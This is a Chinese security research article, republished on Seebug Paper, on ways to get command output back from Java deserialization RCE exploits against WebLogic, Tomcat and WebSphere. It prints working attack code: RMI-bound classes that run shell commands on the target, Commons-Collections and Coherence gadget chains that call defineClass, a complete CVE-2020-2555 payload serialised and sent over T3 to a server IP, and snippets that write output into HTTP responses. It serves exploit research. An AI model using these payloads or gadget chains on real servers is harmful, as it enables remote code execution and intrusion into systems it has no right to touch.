**作者：Skay @ QAX A-TEAM  
原文链接：<https://mp.weixin.qq.com/s/0fWSp71yuaxL_TkZV65EwQ>**

阅读文章前希望先对ClassLoader以及defineClass有了解。[Java
RCE中类反射获取&动态加载](https://mp.weixin.qq.com/s/fkd1Qhgr4BcQXaguCd5TAg)

defineClass归属于ClassLoader类，目前很多java的回显方式都是在其基础上进行改进，其主要作用就是使用编译好的字节码就可以定义一个类。引用于[y4er](https://y4er.com/post/java-deserialization-echo/)

# 一、回显的几种方式

  * 直接调用defineClass
  * RMI绑定实例结合
  * 获取resp写入回显结果
  * 异常抛出 报错回显
  * 写文件
  * Dnslog

# 二、回显方式分析

## 1.RMI绑定实例结合

### (1) RMI/IIOP RCE回显的原理

#### 基本原理

talk is cheap，let‘s see the code

1.定义一个Echo接口，继承Remote类

    
    
    public interface Echo extends Remote {
        String exec(String cmd) throws RemoteException;
    }

2.实现这个接口

    
    
    public class EchoImpl implements Echo{
        @Override
        public String exec(String cmd) throws RemoteException {
            InputStream in = null;
            try {
                in = Runtime.getRuntime().exec(cmd).getInputStream();
            }catch (Exception e){
                e.printStackTrace();
            }
            java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\a");
            String result = s.hasNext()?s.next():"";
            return result;
        }
    }

3.服务端绑定EchoImpl

    
    
    public class EchoServer {
        public static void main(String[] args) throws Exception{
            Echo echo = new EchoImpl();
            Echo e = (Echo) UnicastRemoteObject.exportObject(echo,9999);
            Registry registry =  LocateRegistry.createRegistry(9999);
            registry.bind("Echo",e);
            System.out.println("Start RMI Server................");
        }
    }

4.客户端实现RMI远程方法调用

    
    
    public class EvilClient {
        public static void main(String[] args) throws Exception{
            Registry registry = LocateRegistry.getRegistry("127.0.0.1",9999);
            Echo echo = (Echo) registry.lookup("Echo");
            System.out.println(echo.exec("ipconfig"));
        }
    }

最终实现效果
![图片](https://images.seebug.org/content/images/2020/12/30/1609308471000-1jtdee.png-w331s)

上面RMI回显原理有了，我们有了回显的方法，现在只需再RCE的漏洞利用中，重现构造出上述步骤。

#### **逻辑思路**

  * 利用漏洞点调用ClassLoader的defineClass方法
  * 写入类：defineClass在目标服务器运行返回我们构造的类(已经写好的RMI接口类)
  * 绑定类：将RMI接口类绑定到目标服务器，也就是将我们构造的恶意类注册到rmi注册中心
  * 攻击者本地远程调用方法获取回显结果

**首先，我们先将需要绑定的恶意类准备好。**

我们需要目标存在一个继承了Remote的接口，并且接口方法返回类型为String(因为要返回命令执行的结果)且抛出RemoteException异常，然后本地构造一个类实现这个接口。

直接在Remote类下Ctrl+H

![图片](https://images.seebug.org/content/images/2020/12/30/1609308472000-2sfzns.png-w331s)

weblogic_cmd用的是这个

![图片](https://images.seebug.org/content/images/2020/12/30/1609308472000-3nzktz.png-w331s)

本地构造EvilImpl

    
    
    public class EvilImpl implements ClusterMasterRemote {
        @Override
        public void setServerLocation(String s, String s1) throws RemoteException {
        }
        @Override
        public String getServerLocation(String cmd) throws RemoteException {
            try {
                List<String> cmds = new ArrayList<String>();
                cmds.add("/bin/bash");
                cmds.add("-c");
                cmds.add(cmd);
                ProcessBuilder processBuilder = new ProcessBuilder(cmds);
                processBuilder.redirectErrorStream(true);
                Process proc = processBuilder.start();
                BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                StringBuffer sb = new StringBuffer();
                String line;
                while ((line = br.readLine()) != null) {
                    sb.append(line).append("\n");
                }
                return sb.toString();
            } catch (Exception e) {
                return e.getMessage();
            }
        }
    }

**恶意类准备好了，接下来就是绑定到目标服务器。** 这里使用到的代码

    
    
    RemoteImpl remote = new RemoteImpl();
    try {
        Context context = new InitialContext();
        context.rebind("Evil",remote);
    } catch (Exception e) {
        e.printStackTrace();
    }

在服务端执行上述代码即可将而已类绑定到目标服务器，问题是我们怎么执行上述代码？ 将上述代码写到我们构造的EvilImpl
main方法中，definClass获取到EvilImpl 的 Class后直接利用 **CC** 或者 **coherence** 进行反射调用。

所以我们修改EvilImpl如下

    
    
    public class EvilImpl implements ClusterMasterRemote {
        public static void main(String[] args) {
            EvilImpl remote = new EvilImpl();
            try {
                Context context = new InitialContext();
                context.rebind("Evil",remote);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        @Override
        public void setServerLocation(String s, String s1) throws RemoteException {
        }
        @Override
        public String getServerLocation(String cmd) throws RemoteException {
            try {
                List<String> cmds = new ArrayList<String>();
                cmds.add("/bin/bash");
                cmds.add("-c");
                cmds.add(cmd);
                ProcessBuilder processBuilder = new ProcessBuilder(cmds);
                processBuilder.redirectErrorStream(true);
                Process proc = processBuilder.start();
                BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                StringBuffer sb = new StringBuffer();
                String line;
                while ((line = br.readLine()) != null) {
                    sb.append(line).append("\n");
                }
                return sb.toString();
            } catch (Exception e) {
                return e.getMessage();
            }
        }
    }

**下面还剩最后一个问题，获取defineClass**
，有多种实现方式，可以在Weblogic中找ClassLoader的子类，也可以从Thread中获取，也可直接反射调用。

### (2) Weblogic 结合CC链 回显实现

上面回显原理已经将大体流程说明完毕，CC的引入就是为了解决两个问题，defineClass的获取，以及EvilImpl类main方法的反射调用。

#### defineClass的获取

网上大多是直接找的ClassLoader的子类

    
    
    jxxload_help.PathVFSJavaLoader#loadClassFromBytes
    org.python.core.BytecodeLoader1#loadClassFromBytes
    sun.org.mozilla.javascript.internal.DefiningClassLoader#defineClass
    java.security.SecureClassLoader#defineClass(java.lang.String, byte[], int, int, java.security.CodeSource)
    org.mozilla.classfile.DefiningClassLoader#defineClass

org.mozilla.classfile.DefiningClassLoader#defineClass 使用这个

#### CC链构造

接下来就是结合CC利用链进行构造，首先获取defineClass，然后调用我们EvilImple的main方法。CC是可以调用任意类的任意方法的，所以构造起来也很容易(当然了，是站在前人的肩膀上，手动狗头)

    
    
    Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(DefiningClassLoader.class),
        new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
        new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
        new InvokerTransformer("defineClass",
                               new Class[]{String.class, byte[].class}, new Object[]{className, clsData}),
        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"main", new Class[]{String[].class}}),
        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}),
        new ConstantTransformer(new HashSet())
    };

至此，整个回显过程就串起来了，weblogic的反序列化RCE为漏洞点，CC链串起来回显的整个过程：从defineClass的调用到EvilImple的绑定，最后攻击者本地调用远程方法即可实现回显。

### (3) Weblogic 结合coherence链 回显实现

虽然上述回显已经成功，但是CC链早就被Weblogic放入了黑名单，且在18年补丁之后，Weblogic修改了自身的cc依赖，使之不能反序列化。新的漏洞需要实现回显，需要重新找出一个可以替代CC的链
---> coherence中的LimitFilter

首先复习以下CVE-2020-2555的利用链 BadAttributeValueExpException -> readObject ->
LimitFilte的toString(Coherence中) -> ReflectionExtractor的extract() ->
method.invoke()

payload如下

    
    
     // Runtime.class.getRuntime()
            ReflectionExtractor extractor1 = new ReflectionExtractor(
                    "getMethod",
                    new Object[]{"getRuntime", new Class[0]}
            );
            // get invoke() to execute exec()
            ReflectionExtractor extractor2 = new ReflectionExtractor(
                    "invoke",
                    new Object[]{null, new Object[0]}
            );
            // invoke("exec","calc")
            ReflectionExtractor extractor3 = new ReflectionExtractor(
                    "exec",
                    new Object[]{new String[]{"cmd", "/c", "calc"}}
            );
            ReflectionExtractor[] extractors = {
                    extractor1,
                    extractor2,
                    extractor3,
            };
            ChainedExtractor chainedExtractor = new ChainedExtractor(extractors);
            LimitFilter limitFilter = new LimitFilter();
            //m_comparator
            Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
            m_comparator.setAccessible(true);
            m_comparator.set(limitFilter, chainedExtractor);
            //m_oAnchorTop
            Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
            m_oAnchorTop.setAccessible(true);
            m_oAnchorTop.set(limitFilter, Runtime.class);
            // BadAttributeValueExpException toString()
            // This only works in JDK 8u76 and WITHOUT a security manager
            // https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70
            BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
            Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
            field.setAccessible(true);
            field.set(badAttributeValueExpException, limitFilter);
            // serialize
            byte[] payload = Serializables.serialize(badAttributeValueExpException);
            // T3 send, you can also use python script. weblogic_t3.py
            T3ProtocolOperation.send("10.251.0.116", "7001", payload);
            // test
            serialize(badAttributeValueExpException);
            System.out.print(payload);
    //        deserialize();
        }
        public static void serialize(Object obj) {
            try {
                ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("w2555.ser"));
                os.writeObject(obj);
                os.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        public static void deserialize() {
            try {
                ObjectInputStream is = new ObjectInputStream(new FileInputStream("test.ser"));
                is.readObject();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

看到无回显的CVE-2020-2555 payload 对于com.tangosol.util.filter.LimitFilter
的利用看起来真是似曾相识(commons-collections),，com.tangosol.util.extractor.ReflectionExtractor#extract中，调用了
invoke
,类比于CC中transform的invoke，模仿CC的回显思路，构造coherence的回显，关键的ReflectionExtractor[]构造如下

    
    
    ValueExtractor[] valueExtractors = new ValueExtractor[]{
    ? ? new ReflectionExtractor("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
    ? ? new ReflectionExtractor("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
    ? ? new ReflectionExtractor("defineClass",
    ? ? ? ? ? ? ? ? ? ? ? ? ? ?new Class[]{String.class, byte[].class}, new Object[]{className, clsData}),
    ? ? new ReflectionExtractor("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"main", new Class[]{String[].class}}),
    ? ? new ReflectionExtractor("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}),
    };

## 2.直接调用defineClass

### (1) CVE-2020-14644 回显实现

#### 1.漏洞原理分析

[Weblogic CVE-2020-14644
分析](https://mp.weixin.qq.com/s/uawEudfqvQ6E54Ev8APaaQ)

大致可以认为，是可以执行我们自定义类中statice代买块中的java代码，也就是，执行任意Java代码。

#### 2.回显实现

其实也是借用rmi实现的回显，但是更方便了，我们不用再借用CC或者coherence将整个rmi回显过程串联起来了(也就是省去了defineClass获取以及反射调用main绑定的步骤)，直接将我们的回显逻辑写到static代码块中，目标服务器直接执行即可。

直接看我们要执行的staic代码<https://github.com/potats0/cve_2020_14644>

    
    
    public class test implements Remotable, ClusterMasterRemote {
        static {
            try {
                String bindName = "UnicodeSec";
                Context ctx = new InitialContext();
                test remote = new test();
                ctx.rebind(bindName, remote);
                System.out.println("installed");
            } catch (Exception var1) {
                var1.printStackTrace();
            }
        }
        public test() {
        }
        @Override
        public RemoteConstructor getRemoteConstructor() {
            return null;
        }
        @Override
        public void setRemoteConstructor(RemoteConstructor remoteConstructor) {
        }
        @Override
        public void setServerLocation(String var1, String var2) throws RemoteException {
        }
        @Override
        public String getServerLocation(String cmd) throws RemoteException {
            try {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                List<String> cmds = new ArrayList<String>();
                if (isLinux) {
                    cmds.add("/bin/bash");
                    cmds.add("-c");
                    cmds.add(cmd);
                } else {
                    cmds.add("cmd.exe");
                    cmds.add("/c");
                    cmds.add(cmd);
                }
                ProcessBuilder processBuilder = new ProcessBuilder(cmds);
                processBuilder.redirectErrorStream(true);
                Process proc = processBuilder.start();
                BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                StringBuffer sb = new StringBuffer();
                String line;
                while ((line = br.readLine()) != null) {
                    sb.append(line).append("\n");
                }
                return sb.toString();
            } catch (Exception e) {
                return e.getMessage();
            }
        }
    }

## 3.获取resp写入回显结果

### (1) Tomcat 通用回显

目的：获取返回包并写入回显内容

[站在巨人肩膀上](https://lucifaer.com/2020/05/12/Tomcat%E9%80%9A%E7%94%A8%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/#2-2-2-%E4%BB%8ERegistry%E4%B8%AD%E8%8E%B7%E5%8F%96)，实现逻辑如下
，这里注意下Mbeans的利用(给自己留个坑)

> Registry.getRegistry(null, null).getMBeanServer() ->
> JmxMBeanServer.mbsInterceptor -> DefaultMBeanServerInterceptor.repository ->
> Registory#query -> RequestInfo -> Http11Processor#getRequest() ->
> AbstractProcessor#getRequest() -> Request#getResponse() ->
> Response#doWrite()

具体实现demo
移步[https://xz.aliyun.com/t/7535](https://xz.aliyun.com/t/7535#toc-3)[#toc-3](https://xz.aliyun.com/t/7535#toc-3)

注：回显需要结合在每个gadget中，在反序列化漏洞利用中才能起到真实效果。这里对于gadget的要求最好是可以直接执行java代码，比如CC3
CC4，或者可以间接调用defineClass。当然了，如果漏洞本身就可以直接执行Java代码，那是再方便不过了。

### (2) Weblogic 2725 回显

https://github.com/welove88888/CVE-2019-2725
这个项目中使用的回显方式即先获取当前现成，从中获取返回respose，写入回显内容
代码参考<https://xz.aliyun.com/t/5299#toc-10>

    
    
    String lfcmd = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getHeader("lfcmd");
    weblogic.servlet.internal.ServletResponseImpl response = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getResponse();
    weblogic.servlet.internal.ServletOutputStreamImpl outputStream = response.getServletOutputStream();
    outputStream.writeStream(new weblogic.xml.util.StringInputStream(lfcmd));
    outputStream.flush();
    response.getWriter().write("");
    
    
    java.lang.reflect.Field field = ((weblogic.servlet.provider.ContainerSupportProviderImpl.WlsRequestExecutor)this.getCurrentWork()).getClass().getDeclaredField("connectionHandler");
    field.setAccessible(true);
    HttpConnectionHandler httpConn = (HttpConnectionHandler) field.get(this.getCurrentWork());
    httpConn.getServletRequest().getResponse().getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream("xxxxxx"));

结合CVE-2019-2725这个漏洞，需要将上面的类转化为xml格式，weblogic
xmldecoder反序列化漏洞，从漏洞角度来说，是支持调用任意类的任意方法，这里直接使用org.mozilla.classfile.DefiningClassLoader的defineClass方法将回显写入类实例化执行。
其实，这里也可以结合rmi实现回显的方式，毕竟都可以调用defineClass了。

### (3) Websphere 回显

大体思路也是从线程中获取request respose

参考<http://blog.corener.cc/2020/04/28/Tomcat-Echo/#%E5%BD%A9%E8%9B%8B-websphere%E5%9B%9E%E6%98%BE>

    
    
    Thread t = Thread.currentThread();
    Field wsThreadLocals = t.getClass().getDeclaredField("wsThreadLocals");
    wsThreadLocals.setAccessible(true);
    Object[] obs = (Object[])wsThreadLocals.get(t);
    WebContainerRequestState wr = (WebContainerRequestState)obs[36];
    wr.getCurrentThreadsIExtendedRequest().getRequestURL();

### (4) Spring Boot 回显

网上也有结合Spring Boot 进行回显，弱弱说一句，直接可以利用中间件回显，这个就Pass了先。

## 4.异常抛出 报错回显

### (1) 带回显的攻击RMI服务

这里我们需要跟一下RMI的流程中 **客户端的lookup方法**

站在巨人肩膀上(其实就是偷个懒)<https://blog.csdn.net/qsort_/article/details/104861625>

在UnicastRef类的newCall方法中与服务端建立Socket连接，并发送一些约定的数据

通过ref.invoke方法处理服务端响应回来的序列化数据。

因为在lookup之前执行了getRegisty方法，返回的是RegistryImpl_Stub对象，所以这里的lookup调用的是RegistryImpl_Stub的lookup，我们跟进，已经将关键位置标红

![图片](https://images.seebug.org/content/images/2020/12/30/1609308473000-4shpsh.png-w331s)

**1.首先进入UnicastRef类的newCall方法：**

![图片](https://images.seebug.org/content/images/2020/12/30/1609308474000-5nwvbl.png-w331s)

**1.1 首先是获取了一个TCP连接，**
可以看到是使用LiveRef去创建的连接，在调试RMIServer时，我们已经知道LiveRef中包含TCPEndpoint属性，其中包含ip与端口等通信信息：

![图片](https://images.seebug.org/content/images/2020/12/30/1609308475000-6uepig.png-w331s)

**1.2再往下走，看到new了一个StreamRemoteCall**
对象，进入StreamRemoteCall的构造方法，其做了如下操作，往服务端发送了一些数据：

![图片](https://images.seebug.org/content/images/2020/12/30/1609308476000-7abdag.png-w331s)

**2.回到lookup继续往下走**
，执行了ObjectOutput.writeObject，这里是将lookup方法中传递的远程服务的名称，即字符串“HelloService”进行了序列化并发往了服务端，然后又执行了super.ref.invoke方法，进入该方法如下，然后继续往下走，

通过ref.invoke方法处理服务端响应回来的序列化数据。

![图片](https://images.seebug.org/content/images/2020/12/30/1609308478000-8nzubj.png-w331s)

**3\. lookup往下走，进入StreamRemoteCall类的executeCall方法**
，可以猜到该方法就是处理第7步往服务端发送数据后的服务端响应的数据，看到从响应数据中先读取了一个字节，值为81，然后又继续读取一个字节赋值给var1，

![图片](https://images.seebug.org/content/images/2020/12/30/1609308479000-9dyjtt.png-w331s)

下面是判断var1的值，为1直接return，说明没问题，如果为2的话，会先对对象进行反序列化操作，然后判断是否为Exception类型

网上有关于带回显的攻击RMI服务的exp，它就是将执行完命令后的结果写到异常信息里，然后抛出该异常，这样在客户端就可以看到命令执行的结果了，这时得到的var1的值就是2

![图片](https://images.seebug.org/content/images/2020/12/30/1609308479000-10bsafr.png-w331s)

当上一步var1值为1时，说明没问题，再回到lookup，会执行ObjectInput.readObject方法将服务端返回的数据反序列化，然后将该对象返回（前面我们也知道了，这里获取到的其实是一个代理对象）。至此，客户端整个请求的过程也梳理完了

### (2) URLClassLoader加载远程恶意类，抛出异常回显

首先构造恶意类，将执行结果作为异常抛出

![图片](https://images.seebug.org/content/images/2020/12/30/1609308480000-11ztlmw.png-w331s)

但后利用某个反序列化利用链，调用URLClassloader，远程加载恶意类并执行实现回显

这里是CC5

![图片](https://images.seebug.org/content/images/2020/12/30/1609308480000-12uwnve.png-w331s)

By the way URLClassLoader换成defineClass，利用起来不用出网了就。

## 5.写文件

顾名思义，直接写文件到目标，访问读取，不再赘述

## 6.Dnslog

dnslog方式

# 三、参考链接

<https://y4er.com/post/java-deserialization-echo>

<https://xz.aliyun.com/t/7393>

<https://xz.aliyun.com/t/7228>

<https://github.com/5up3rc/weblogic_cmd>

<https://blog.sari3l.com/posts/fa80d225/>

<https://github.com/potats0/cve_2020_14644>

<https://lucifaer.com/2020/05/12/Tomcat%E9%80%9A%E7%94%A8%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/>

<https://xz.aliyun.com/t/7535>

<https://xz.aliyun.com/t/5299>

<https://blog.csdn.net/qsort_/article/details/104861625>

<https://xz.aliyun.com/t/5257>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1442/>

